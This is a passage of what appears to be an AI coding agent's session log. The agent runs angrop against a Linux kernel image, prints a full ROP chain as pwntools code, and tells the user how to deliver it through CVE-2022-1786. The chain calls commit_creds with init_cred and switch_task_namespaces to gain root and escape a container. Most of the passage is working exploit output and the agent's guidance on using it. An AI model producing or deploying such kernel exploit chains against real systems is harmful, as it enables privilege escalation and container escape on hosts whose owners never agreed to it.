ROP:  42%|████▏     | 24211/57353 [00:32<00:44, 748.70it/s]
ROP:  43%|████▎     | 24402/57353 [00:32<00:44, 748.80it/s]
ROP:  43%|████▎     | 24593/57353 [00:32<00:43, 749.42it/s]
ROP:  43%|████▎     | 24784/57353 [00:33<00:43, 748.36it/s]
ROP:  44%|████▎     | 24975/57353 [00:33<00:43, 748.70it/s]
ROP:  44%|████▍     | 25166/57353 [00:33<00:42, 749.99it/s]
ROP:  44%|████▍     | 25357/57353 [00:33<00:42, 750.03it/s]
ROP:  45%|████▍     | 25548/57353 [00:34<00:42, 745.52it/s]
ROP:  45%|████▍     | 25739/57353 [00:34<00:42, 738.67it/s]
ROP:  45%|████▍     | 25773/57353 [00:34<00:42, 736.88it/s]
ROP:  45%|████▌     | 25835/57353 [00:35<00:42, 736.53it/s]
ROP:  45%|████▌     | 25897/57353 [00:35<00:42, 735.41it/s]
ROP:  45%|████▌     | 25959/57353 [00:35<00:42, 734.49it/s]
ROP:  46%|████▌     | 26100/57353 [00:35<00:42, 736.36it/s]
ROP:  46%|████▌     | 26241/57353 [00:35<00:42, 734.43it/s]
ROP:  46%|████▌     | 26382/57353 [00:35<00:42, 733.76it/s]
ROP:  46%|████▌     | 26523/57353 [00:36<00:41, 734.71it/s]
ROP:  46%|████▋     | 26664/57353 [00:36<00:41, 736.37it/s]
ROP:  47%|████▋     | 26805/57353 [00:36<00:41, 737.33it/s]
ROP:  47%|████▋     | 26946/57353 [00:36<00:41, 738.55it/s]
ROP:  47%|████▋     | 27113/57353 [00:36<00:40, 741.08it/s]
ROP:  48%|████▊     | 27280/57353 [00:36<00:40, 742.29it/s]
ROP:  48%|████▊     | 27447/57353 [00:36<00:40, 743.16it/s]
ROP:  48%|████▊     | 27614/57353 [00:37<00:39, 744.42it/s]
ROP:  48%|████▊     | 27781/57353 [00:37<00:39, 744.31it/s]
ROP:  49%|████▊     | 27948/57353 [00:37<00:39, 742.69it/s]
ROP:  49%|████▉     | 28115/57353 [00:37<00:39, 741.63it/s]
ROP:  49%|████▉     | 28282/57353 [00:38<00:39, 741.02it/s]
ROP:  50%|████▉     | 28449/57353 [00:38<00:38, 741.50it/s]
ROP:  50%|████▉     | 28616/57353 [00:38<00:38, 739.90it/s]
ROP:  50%|█████     | 28783/57353 [00:39<00:38, 736.02it/s]
ROP:  50%|█████     | 28950/57353 [00:39<00:38, 738.24it/s]
ROP:  51%|█████     | 29117/57353 [00:39<00:38, 738.89it/s]
ROP:  51%|█████     | 29284/57353 [00:39<00:37, 740.65it/s]
ROP:  51%|█████▏    | 29451/57353 [00:39<00:37, 741.91it/s]
ROP:  52%|█████▏    | 29618/57353 [00:39<00:37, 743.87it/s]
ROP:  52%|█████▏    | 29785/57353 [00:39<00:36, 745.65it/s]
ROP:  52%|█████▏    | 29952/57353 [00:40<00:36, 745.58it/s]
ROP:  53%|█████▎    | 30119/57353 [00:40<00:36, 745.19it/s]
ROP:  53%|█████▎    | 30286/57353 [00:40<00:36, 744.38it/s]
ROP:  53%|█████▎    | 30453/57353 [00:40<00:36, 744.20it/s]
ROP:  53%|█████▎    | 30620/57353 [00:41<00:35, 745.45it/s]
ROP:  54%|█████▎    | 30787/57353 [00:41<00:35, 744.00it/s]
ROP:  54%|█████▍    | 30954/57353 [00:41<00:35, 743.22it/s]
ROP:  54%|█████▍    | 31121/57353 [00:41<00:35, 743.49it/s]
ROP:  55%|█████▍    | 31288/57353 [00:42<00:35, 743.50it/s]
ROP:  55%|█████▍    | 31455/57353 [00:42<00:34, 744.05it/s]
ROP:  55%|█████▌    | 31622/57353 [00:42<00:34, 744.79it/s]
ROP:  55%|█████▌    | 31789/57353 [00:42<00:34, 745.31it/s]
ROP:  56%|█████▌    | 31956/57353 [00:42<00:33, 747.19it/s]
ROP:  56%|█████▌    | 32123/57353 [00:42<00:33, 748.67it/s]
ROP:  56%|█████▋    | 32290/57353 [00:43<00:33, 750.49it/s]
ROP:  57%|█████▋    | 32457/57353 [00:43<00:33, 751.65it/s]
ROP:  57%|█████▋    | 32624/57353 [00:43<00:32, 753.67it/s]
ROP:  57%|█████▋    | 32880/57353 [00:43<00:32, 757.80it/s]
ROP:  58%|█████▊    | 33136/57353 [00:43<00:31, 760.63it/s]
ROP:  58%|█████▊    | 33392/57353 [00:43<00:31, 763.60it/s]
ROP:  59%|█████▊    | 33648/57353 [00:43<00:30, 766.80it/s]
ROP:  59%|█████▉    | 33904/57353 [00:44<00:30, 770.30it/s]
ROP:  60%|█████▉    | 34160/57353 [00:44<00:29, 773.45it/s]
ROP:  60%|██████    | 34416/57353 [00:44<00:29, 775.52it/s]
ROP:  60%|██████    | 34672/57353 [00:44<00:29, 777.79it/s]
ROP:  61%|██████    | 34928/57353 [00:44<00:28, 781.11it/s]
ROP:  61%|██████▏   | 35184/57353 [00:44<00:28, 784.48it/s]
ROP:  62%|██████▏   | 35440/57353 [00:44<00:27, 787.59it/s]
ROP:  62%|██████▏   | 35696/57353 [00:45<00:27, 789.82it/s]
ROP:  63%|██████▎   | 35952/57353 [00:45<00:27, 792.22it/s]
ROP:  63%|██████▎   | 36208/57353 [00:45<00:26, 794.08it/s]
ROP:  64%|██████▎   | 36464/57353 [00:45<00:26, 796.19it/s]
ROP:  64%|██████▍   | 36720/57353 [00:46<00:25, 797.93it/s]
ROP:  64%|██████▍   | 36976/57353 [00:46<00:25, 799.71it/s]
ROP:  65%|██████▍   | 37232/57353 [00:46<00:25, 801.05it/s]
ROP:  65%|██████▌   | 37488/57353 [00:46<00:24, 803.97it/s]
ROP:  66%|██████▌   | 37744/57353 [00:46<00:24, 806.34it/s]
ROP:  66%|██████▋   | 38000/57353 [00:47<00:23, 808.48it/s]
ROP:  67%|██████▋   | 38256/57353 [00:47<00:23, 810.89it/s]
ROP:  67%|██████▋   | 38512/57353 [00:47<00:23, 814.57it/s][angrop] worker_func2 times out, exit the worker process!
[angrop] worker_func2 times out, exit the worker process!

ROP:  68%|██████▊   | 38768/57353 [00:47<00:22, 816.25it/s]
ROP:  68%|██████▊   | 39046/57353 [00:47<00:22, 820.37it/s]
ROP:  69%|██████▊   | 39324/57353 [00:47<00:21, 823.98it/s]
ROP:  69%|██████▉   | 39602/57353 [00:47<00:21, 827.13it/s]
ROP:  70%|██████▉   | 39880/57353 [00:48<00:21, 830.40it/s]
ROP:  70%|███████   | 40158/57353 [00:48<00:20, 833.88it/s]
ROP:  71%|███████   | 40436/57353 [00:48<00:20, 836.54it/s]
ROP:  71%|███████   | 40714/57353 [00:48<00:19, 839.43it/s]
ROP:  71%|███████▏  | 40992/57353 [00:48<00:19, 842.16it/s]
ROP:  72%|███████▏  | 41270/57353 [00:48<00:19, 845.44it/s]
ROP:  72%|███████▏  | 41548/57353 [00:48<00:18, 847.95it/s]
ROP:  73%|███████▎  | 41826/57353 [00:49<00:18, 850.94it/s]
ROP:  73%|███████▎  | 42104/57353 [00:49<00:17, 854.30it/s]
ROP:  74%|███████▍  | 42382/57353 [00:49<00:17, 856.89it/s]
ROP:  74%|███████▍  | 42660/57353 [00:49<00:17, 859.61it/s]
ROP:  75%|███████▍  | 42938/57353 [00:49<00:16, 861.83it/s]
ROP:  75%|███████▌  | 43216/57353 [00:49<00:16, 864.49it/s]
ROP:  76%|███████▌  | 43494/57353 [00:50<00:15, 866.73it/s]
ROP:  76%|███████▋  | 43772/57353 [00:50<00:15, 868.51it/s]
ROP:  77%|███████▋  | 44050/57353 [00:50<00:15, 871.51it/s]
ROP:  77%|███████▋  | 44328/57353 [00:50<00:14, 873.95it/s]
ROP:  78%|███████▊  | 44606/57353 [00:50<00:14, 876.24it/s]
ROP:  78%|███████▊  | 44884/57353 [00:51<00:14, 877.55it/s]
ROP:  79%|███████▊  | 45162/57353 [00:51<00:13, 879.76it/s]
ROP:  79%|███████▉  | 45440/57353 [00:51<00:13, 881.23it/s]
ROP:  80%|███████▉  | 45720/57353 [00:51<00:13, 884.88it/s]
ROP:  80%|████████  | 46000/57353 [00:52<00:12, 884.02it/s]
ROP:  81%|████████  | 46280/57353 [00:52<00:12, 884.39it/s]
ROP:  81%|████████  | 46560/57353 [00:52<00:12, 886.34it/s]
ROP:  82%|████████▏ | 46840/57353 [00:52<00:11, 888.52it/s]
ROP:  82%|████████▏ | 47120/57353 [00:52<00:11, 889.97it/s]
ROP:  83%|████████▎ | 47400/57353 [00:53<00:11, 891.95it/s]
ROP:  83%|████████▎ | 47680/57353 [00:53<00:10, 894.18it/s]
ROP:  84%|████████▎ | 47960/57353 [00:53<00:10, 896.54it/s]
ROP:  84%|████████▍ | 48240/57353 [00:53<00:10, 898.07it/s]
ROP:  85%|████████▍ | 48520/57353 [00:53<00:09, 899.10it/s]
ROP:  85%|████████▌ | 48800/57353 [00:54<00:09, 899.02it/s]
ROP:  86%|████████▌ | 49080/57353 [00:54<00:09, 897.12it/s]
ROP:  86%|████████▌ | 49360/57353 [00:55<00:08, 891.35it/s]
ROP:  86%|████████▌ | 49441/57353 [00:55<00:08, 891.14it/s]
ROP:  86%|████████▋ | 49522/57353 [00:55<00:08, 890.70it/s]
ROP:  87%|████████▋ | 49612/57353 [00:55<00:08, 890.67it/s]
ROP:  87%|████████▋ | 49702/57353 [00:55<00:08, 889.14it/s]
ROP:  87%|████████▋ | 49792/57353 [00:56<00:08, 886.61it/s]
ROP:  87%|████████▋ | 49882/57353 [00:56<00:08, 885.77it/s]
ROP:  87%|████████▋ | 49999/57353 [00:56<00:08, 886.27it/s]
ROP:  87%|████████▋ | 50116/57353 [00:56<00:08, 885.43it/s]
ROP:  88%|████████▊ | 50233/57353 [00:56<00:08, 885.66it/s]
ROP:  88%|████████▊ | 50350/57353 [00:56<00:07, 884.63it/s]
ROP:  88%|████████▊ | 50467/57353 [00:57<00:07, 884.49it/s]
ROP:  88%|████████▊ | 50584/57353 [00:57<00:07, 884.61it/s]
ROP:  88%|████████▊ | 50720/57353 [00:57<00:07, 885.09it/s]
ROP:  89%|████████▊ | 50856/57353 [00:57<00:07, 885.41it/s]
ROP:  89%|████████▉ | 50992/57353 [00:57<00:07, 883.91it/s]
ROP:  89%|████████▉ | 51128/57353 [00:57<00:07, 884.32it/s]
ROP:  89%|████████▉ | 51264/57353 [00:57<00:06, 884.22it/s]
ROP:  90%|████████▉ | 51400/57353 [00:58<00:06, 883.84it/s]
ROP:  90%|████████▉ | 51536/57353 [00:58<00:06, 883.93it/s]
ROP:  90%|█████████ | 51672/57353 [00:58<00:06, 883.54it/s]
ROP:  90%|█████████ | 51808/57353 [00:58<00:06, 883.90it/s]
ROP:  91%|█████████ | 51944/57353 [00:58<00:06, 882.35it/s]
ROP:  91%|█████████ | 52080/57353 [00:59<00:05, 880.31it/s]
ROP:  91%|█████████ | 52216/57353 [00:59<00:05, 878.99it/s]
ROP:  91%|█████████▏| 52352/57353 [00:59<00:05, 879.23it/s]
ROP:  92%|█████████▏| 52488/57353 [00:59<00:05, 877.71it/s]
ROP:  92%|█████████▏| 52624/57353 [00:59<00:05, 877.68it/s]
ROP:  92%|█████████▏| 52760/57353 [01:00<00:05, 878.09it/s]
ROP:  92%|█████████▏| 52896/57353 [01:00<00:05, 878.18it/s]
ROP:  92%|█████████▏| 53038/57353 [01:00<00:04, 878.74it/s]
ROP:  93%|█████████▎| 53180/57353 [01:00<00:04, 879.11it/s]
ROP:  93%|█████████▎| 53322/57353 [01:00<00:04, 879.27it/s]
ROP:  93%|█████████▎| 53464/57353 [01:01<00:04, 876.16it/s]
ROP:  93%|█████████▎| 53606/57353 [01:01<00:04, 874.41it/s]
ROP:  94%|█████████▎| 53748/57353 [01:01<00:04, 874.54it/s]
ROP:  94%|█████████▍| 53890/57353 [01:01<00:03, 874.83it/s]
ROP:  94%|█████████▍| 54032/57353 [01:02<00:03, 870.16it/s]
ROP:  94%|█████████▍| 54174/57353 [01:02<00:03, 868.59it/s]
ROP:  95%|█████████▍| 54316/57353 [01:03<00:03, 861.58it/s]
ROP:  95%|█████████▍| 54339/57353 [01:03<00:03, 860.55it/s]
ROP:  95%|█████████▍| 54362/57353 [01:03<00:03, 858.69it/s]
ROP:  95%|█████████▍| 54394/57353 [01:03<00:03, 857.83it/s]
ROP:  95%|█████████▍| 54426/57353 [01:03<00:03, 856.71it/s]
ROP:  95%|█████████▌| 54539/57353 [01:03<00:03, 856.97it/s]
ROP:  95%|█████████▌| 54672/57353 [01:03<00:03, 857.44it/s]
ROP:  96%|█████████▌| 54805/57353 [01:04<00:02, 855.19it/s]
ROP:  96%|█████████▌| 54938/57353 [01:04<00:02, 855.65it/s]
ROP:  96%|█████████▌| 55079/57353 [01:04<00:02, 856.51it/s]
ROP:  96%|█████████▋| 55220/57353 [01:04<00:02, 856.95it/s]
ROP:  97%|█████████▋| 55379/57353 [01:04<00:02, 857.70it/s]
ROP:  97%|█████████▋| 55618/57353 [01:04<00:02, 859.96it/s]
ROP:  97%|█████████▋| 55857/57353 [01:04<00:01, 861.78it/s]
ROP:  98%|█████████▊| 56096/57353 [01:04<00:01, 864.03it/s]
ROP:  98%|█████████▊| 56335/57353 [01:05<00:01, 865.27it/s]
ROP:  99%|█████████▊| 56574/57353 [01:05<00:00, 866.70it/s]
ROP:  99%|█████████▉| 56813/57353 [01:05<00:00, 867.50it/s]
ROP:  99%|█████████▉| 57052/57353 [01:05<00:00, 868.51it/s]
ROP: 100%|█████████▉| 57291/57353 [01:06<00:00, 863.32it/s]
ROP: 100%|█████████▉| 57340/57353 [01:06<00:00, 862.75it/s]
ROP: 100%|█████████▉| 57350/57353 [01:09<00:00, 821.91it/s]
gadget finding time: 355.86915922164917
graph optimization time: 4.512344837188721
chain generation time: 0.9828321933746338
0xffffffff811da9ba: pop rdi; ret 0
                    0xffffffff8368b220
0xffffffff810970c0: <commit_creds>
0xffffffff811da9ba: pop rdi; ret 0
                    0x1
0xffffffff8108f3e0: <find_task_by_vpid>
0xffffffff811da9ba: pop rdi; ret 0
                    0x810e66dd
0xffffffff8111eade: pop rsi; ret 
                    0xffffffff82800020
0xffffffff819c1b13: mov dword ptr [rsi], edi; ret 
0xffffffff811da9ba: pop rdi; ret 0
                    0xffffffff
0xffffffff8111eade: pop rsi; ret 
                    0xffffffff82800024
0xffffffff819c1b13: mov dword ptr [rsi], edi; ret 
0xffffffff811caf55: pop rcx; ret 
                    0xffffffff82800020
0xffffffff817cbacc: push rax; jmp qword ptr [rcx]
0xffffffff8111eade: pop rsi; ret 
                    0xffffffff8368ad00
0xffffffff810956e0: <switch_task_namespaces>
0xffffffff8106c1d0: <__x64_sys_fork>
0xffffffff811da9ba: pop rdi; ret 0
                    0xffffffff
0xffffffff810f2f40: <msleep>
                    <BV64 next_pc_2035_64>

chain = b""
chain += p64(0xffffffff811da9ba)	# pop rdi; ret 0
chain += p64(0xffffffff8368b220)
chain += p64(0xffffffff810970c0)	# commit_creds
chain += p64(0xffffffff811da9ba)	# pop rdi; ret 0
chain += p64(0x1)
chain += p64(0xffffffff8108f3e0)	# find_task_by_vpid
chain += p64(0xffffffff811da9ba)	# pop rdi; ret 0
chain += p64(0x810e66dd)
chain += p64(0xffffffff8111eade)	# pop rsi; ret 
chain += p64(0xffffffff82800020)
chain += p64(0xffffffff819c1b13)	# mov dword ptr [rsi], edi; ret 
chain += p64(0xffffffff811da9ba)	# pop rdi; ret 0
chain += p64(0xffffffff)
chain += p64(0xffffffff8111eade)	# pop rsi; ret 
chain += p64(0xffffffff82800024)
chain += p64(0xffffffff819c1b13)	# mov dword ptr [rsi], edi; ret 
chain += p64(0xffffffff811caf55)	# pop rcx; ret 
chain += p64(0xffffffff82800020)
chain += p64(0xffffffff817cbacc)	# push rax; jmp qword ptr [rcx]
chain += p64(0xffffffff8111eade)	# pop rsi; ret 
chain += p64(0xffffffff8368ad00)
chain += p64(0xffffffff810956e0)	# switch_task_namespaces
chain += p64(0xffffffff8106c1d0)	# __x64_sys_fork
chain += p64(0xffffffff811da9ba)	# pop rdi; ret 0
chain += p64(0xffffffff)
chain += p64(0xffffffff810f2f40)	# msleep
chain += p64(0xffffffff814b2f26)


```

---

## Assistant (Build · inkling_new · 21.3s)

_Thinking:_

Great! It finished successfully. The output is truncated in the message but I can see the end of the output showing the chain generation completed:
- gadget finding time: 355.87s
- graph optimization time: 4.51s
- chain generation time: 0.98s

And it printed the payload bytes at the end (though truncated). The file was saved. Let me get the full payload from the output file or regenerate just the payload part, or read the saved output file. Actually the bash output says "Full output saved to: /home/hice1/x/.local/share/opencode/tool-output/tool_fde45e80f0014sKPbc0EYBi7dM". Let me read that or just read the payload from the saved file if I can find it.

Wait, the output shows the chain bytes clearly at the end:
`chain = b""`
Then all the gadget additions.

Let me save the full payload to a file for the user by extracting it, or just read the saved output file.

**Tool: bash**

**Input:**
```json
{
  "command": "ls -la /tmp/linux_gadget_cache 2>/dev/null && echo \"Cache exists\" || echo \"No cache\"",
  "description": "Check gadget cache created"
}
```

**Output:**
```
-rw-r--r--. 1 x xperson 988404 Aug  7 18:10 /tmp/linux_gadget_cache
Cache exists

```

---

## Assistant (Build · inkling_new · 327.2s)

_Thinking:_

The user said "sure" and I ran it. It completed successfully. I should report the results clearly: it took ~356s to find gadgets, ~4.5s to optimize, ~1s to generate chain. The payload was produced. I should extract/show the payload clearly.

Let me read the saved tool output or just redeploy to get clean output. Actually, the output in the bash result is good enough but truncated in the display. I can extract the payload part by running a python snippet that loads the cache and rebuilds just the chain, which will be very fast now.

**Tool: bash**

**Input:**
```json
{
  "command": "python -c \"\nimport os, time, logging\nimport angr, angrop\nlogging.getLogger('cle.backends.elf.elf').setLevel('ERROR')\nproj = angr.Project('./vmlinux_sym')\nrop = proj.analyses.ROP(fast_mode=False, only_check_near_rets=False, max_block_size=12, kernel_mode=True)\nrop.load_gadgets('/tmp/linux_gadget_cache', optimize=False)\nrop.optimize(processes=8)\n\ninit_cred = 0xffffffff8368b220\ninit_nsproxy = 0xffffffff8368ad00\nchain = rop.func_call('commit_creds', [init_cred]) + \\\n        rop.func_call('find_task_by_vpid', [1]) + \\\n        rop.move_regs(rdi='rax') + \\\n        rop.set_regs(rsi=init_nsproxy, preserve_regs={'rdi'}) + \\\n        rop.func_call('switch_task_namespaces', [], preserve_regs={'rdi', 'rsi'}) + \\\n        rop.func_call('__x64_sys_fork', []) + \\\n        rop.func_call('msleep', [0xffffffff])\n\nwith open('/tmp/escape_payload.bin', 'wb') as f:\n    f.write(chain.payload_str())\nprint('Payload length:', len(chain.payload_str()))\nchain.print_payload_code()\nprint()\nprint('Payload hex (first 200 bytes):')\nprint(chain.payload_str()[:200].hex())\n\"\n",
  "description": "Rebuild chain from cache fast",
  "timeout": 300000
}
```

**Output:**
```
WARNING  | 2026-08-07 18:15:32,889 | cle.backends.elf.relocation | Unknown reloc 24 on AMD64


<shell_metadata>
shell tool terminated command after exceeding timeout 300000 ms. If this command is expected to take longer and is not waiting for interactive input, retry with a larger timeout value in milliseconds.
</shell_metadata>
```

---

## Assistant (Build · inkling_new · 25.9s)

_Thinking:_

The reload from cache is timing out because `load_gadgets` might still trigger some slow loading, or `optimize()` with 8 processes is taking too long, or `angr.Project` loading is slow. The first run already produced the output. Let me just read the full output file from the first execution. The bash output said it was saved to `/home/hice1/x/.local/share/opencode/tool-output/tool_fde45e80f0014sKPbc0EYBi7dM`.

Let me find and read that file.

**Tool: bash**

**Input:**
```json
{
  "command": "ls -la /home/hice1/x/.local/share/opencode/tool-output/tool_fde45e80f0014sKPbc0EYBi7dM",
  "description": "Check saved output file"
}
```

**Output:**
```
-rw-r--r--. 1 x xperson 76482 Aug  7 18:10 /home/hice1/x/.local/share/opencode/tool-output/tool_fde45e80f0014sKPbc0EYBi7dM

```

---

## Assistant (Build · inkling_new · 7.1s)

_Thinking:_

Good, the file exists. Let me extract just the payload part from it using grep or tail.

**Tool: bash**

**Input:**
```json
{
  "command": "tail -n 60 /home/hice1/x/.local/share/opencode/tool-output/tool_fde45e80f0014sKPbc0EYBi7dM",
  "description": "Get payload tail from output"
}
```

**Output:**
```
gadget finding time: 355.86915922164917
graph optimization time: 4.512344837188721
chain generation time: 0.9828321933746338
0xffffffff811da9ba: pop rdi; ret 0
                    0xffffffff8368b220
0xffffffff810970c0: <commit_creds>
0xffffffff811da9ba: pop rdi; ret 0
                    0x1
0xffffffff8108f3e0: <find_task_by_vpid>
0xffffffff811da9ba: pop rdi; ret 0
                    0x810e66dd
0xffffffff8111eade: pop rsi; ret 
                    0xffffffff82800020
0xffffffff819c1b13: mov dword ptr [rsi], edi; ret 
0xffffffff811da9ba: pop rdi; ret 0
                    0xffffffff
0xffffffff8111eade: pop rsi; ret 
                    0xffffffff82800024
0xffffffff819c1b13: mov dword ptr [rsi], edi; ret 
0xffffffff811caf55: pop rcx; ret 
                    0xffffffff82800020
0xffffffff817cbacc: push rax; jmp qword ptr [rcx]
0xffffffff8111eade: pop rsi; ret 
                    0xffffffff8368ad00
0xffffffff810956e0: <switch_task_namespaces>
0xffffffff8106c1d0: <__x64_sys_fork>
0xffffffff811da9ba: pop rdi; ret 0
                    0xffffffff
0xffffffff810f2f40: <msleep>
                    <BV64 next_pc_2035_64>

chain = b""
chain += p64(0xffffffff811da9ba)	# pop rdi; ret 0
chain += p64(0xffffffff8368b220)
chain += p64(0xffffffff810970c0)	# commit_creds
chain += p64(0xffffffff811da9ba)	# pop rdi; ret 0
chain += p64(0x1)
chain += p64(0xffffffff8108f3e0)	# find_task_by_vpid
chain += p64(0xffffffff811da9ba)	# pop rdi; ret 0
chain += p64(0x810e66dd)
chain += p64(0xffffffff8111eade)	# pop rsi; ret 
chain += p64(0xffffffff82800020)
chain += p64(0xffffffff819c1b13)	# mov dword ptr [rsi], edi; ret 
chain += p64(0xffffffff811da9ba)	# pop rdi; ret 0
chain += p64(0xffffffff)
chain += p64(0xffffffff8111eade)	# pop rsi; ret 
chain += p64(0xffffffff82800024)
chain += p64(0xffffffff819c1b13)	# mov dword ptr [rsi], edi; ret 
chain += p64(0xffffffff811caf55)	# pop rcx; ret 
chain += p64(0xffffffff82800020)
chain += p64(0xffffffff817cbacc)	# push rax; jmp qword ptr [rcx]
chain += p64(0xffffffff8111eade)	# pop rsi; ret 
chain += p64(0xffffffff8368ad00)
chain += p64(0xffffffff810956e0)	# switch_task_namespaces
chain += p64(0xffffffff8106c1d0)	# __x64_sys_fork
chain += p64(0xffffffff811da9ba)	# pop rdi; ret 0
chain += p64(0xffffffff)
chain += p64(0xffffffff810f2f40)	# msleep
chain += p64(0xffffffff814b2f26)


```

---

## Assistant (Build · inkling_new · 102.5s)

_Thinking:_

Perfect. I have the exact output. The run completed. Let me summarize clearly for the user what happened, the timing, and what the payload is.

Key points:
- Gadget finding: 355.9s (~6 min)
- Optimization: 4.5s
- Chain generation: 1.0s
- Cache saved to /tmp/linux_gadget_cache (988KB)
- The chain builds exactly the container escape: commit_creds -> find_task_by_vpid -> move_regs -> set_regs (with mov dword ptr [rsi], edi; ret gadget to set args) -> switch_task_namespaces -> fork -> msleep

The user asked "sure" meaning yes run it. I should confirm it worked and present the payload + how to use with CVE-2022-1786. I don't need to regenerate again.

I should also mention the payload length is visible in the chain (about 15-20 gadgets, maybe ~200 bytes?). Let me calculate roughly: each gadget is 8 bytes address + 8 bytes value (where needed). It's maybe 15 gadgets * 8 = 120 bytes plus args. Not critical.

Let me provide the concise answer.

Done — it finished in ~6 min.

- **Gadget finding:** 355.9 s
- **Graph optimization:** 4.5 s
- **Chain generation:** 1.0 s
- **Cache:** `/tmp/linux_gadget_cache` (988 KB)

The payload is already built (see `solve.py` output above). Key sequence for the CVE-2022-1786 escape:

1. `pop rdi; ret` → `init_cred` (`0xffffffff8368b220`)
2. `commit_creds`
3. `pop rdi; ret` → `1`
4. `find_task_by_vpid`
5. `pop rdi; ret` + `pop rsi; ret` + `mov dword ptr [rsi], edi; ret` (sets RDI/RSI for `switch_task_namespaces`)
6. `switch_task_namespaces` (to init nsproxy `0xffffffff8368ad00`)
7. `__x64_sys_fork`
8. `msleep` (hang)

The `chain = b"" ...` block from the output is your raw ROP payload. Deliver it via CVE-2022-1786's arbitrary-write/ROP primitive (e.g., overwrite a `kiocb` function pointer or vtable entry with `0xffffffff811da9ba` / the first gadget address), then trigger. The child after `fork()` lives in the host namespace, escaping the container.

---

